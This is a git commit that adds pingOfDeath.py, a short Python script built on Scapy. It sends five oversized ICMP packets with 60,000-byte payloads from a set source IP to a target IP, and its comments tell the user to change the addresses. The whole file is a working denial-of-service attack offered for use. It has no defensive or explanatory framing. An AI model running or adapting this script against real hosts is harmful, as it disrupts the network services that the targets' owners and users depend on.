83b73e6f9673ca412a52f45db16c1ac9cc3d7f12
André Monteiro <36992115+am0nt31r0@users.noreply.github.com>
2018-09-30 15:50:57 +0100

    Add files via upload

---
+++ pingOfDeath.py
@@ -0,0 +1,13 @@
+#!/usr/bin/python
+
+from scapy.all import *
+import os
+
+# Change according with your IP addresses
+SOURCE_IP="10.0.1.1"
+TARGET_IP="10.0.1.5"
+MESSAGE="T"
+NUMBER_PACKETS=5 # Number of pings
+
+pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
+send(NUMBER_PACKETS*pingOFDeath)
